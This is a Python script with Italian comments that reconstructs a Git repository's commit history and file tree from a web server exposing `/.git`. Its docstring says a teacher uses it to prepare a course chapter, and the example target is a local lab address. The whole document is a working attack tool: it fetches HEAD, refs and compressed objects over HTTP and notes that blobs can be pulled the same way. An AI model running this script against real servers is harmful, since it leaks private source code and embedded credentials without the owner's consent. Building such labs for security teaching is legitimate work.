#!/usr/bin/env python3
"""Ricostruisce un repository esposto servendo solo file statici (attacco a `/.git`).

Uso: python3 dump-git.py http://127.0.0.1:8081/.git

Serve al docente per preparare il capitolo 1 quando `git-dumper` non è installato: legge
HEAD, refs e objects via HTTP e ricostruisce l'albero dei commit. Non serve a scaricare i
blob: per quelli basta la stessa `oggetto(sha)` e una `open(nome, "wb")`.
"""
import sys, urllib.request, zlib

BASE = sys.argv[1].rstrip('/')
cache = {}

def prendi(percorso):
    if percorso not in cache:
        cache[percorso] = urllib.request.urlopen(f"{BASE}/{percorso}").read()
    return cache[percorso]

def oggetto(sha):
    dati = zlib.decompress(prendi(f"objects/{sha[:2]}/{sha[2:]}"))
    intestazione, _, corpo = dati.partition(b"\0")
    tipo, _, _ = intestazione.decode().partition(" ")
    return tipo, corpo

def percorso_albero(sha):
    tipo, corpo = oggetto(sha)
    i = 0
    while i < len(corpo):
        j = corpo.index(b"\0", i)
        modo, nome = corpo[i:j].decode().split(" ", 1)
        sha2 = corpo[j+1:j+21].hex()
        i = j + 21
        yield modo, nome, sha2

ref = prendi("HEAD").decode().strip()
sha = ref.split(" ")[1] if ref.startswith("ref:") else ref
if ref.startswith("ref:"):
    sha = prendi(sha).decode().strip()

while sha:
    tipo, corpo = oggetto(sha)
    assert tipo == "commit", tipo
    righe = corpo.decode(errors="replace").split("\n")
    autore = [r for r in righe if r.startswith("author ")][0][7:]
    messaggio = righe[righe.index("") + 1].strip() if "" in righe else ""
    print(f"\n=== {sha[:7]} {autore} : {messaggio}")
    albero = [r for r in righe if r.startswith("tree ")][0][5:]
    for modo, nome, sha2 in percorso_albero(albero):
        if nome in ("app", "routes", "config", "database"):
            print(f"  {modo} {nome}/")
        else:
            print(f"  {modo} {nome} ({len(oggetto(sha2)[1])} byte)")
    genitori = [r for r in righe if r.startswith("parent ")]
    sha = genitori[0][7:] if genitori else None
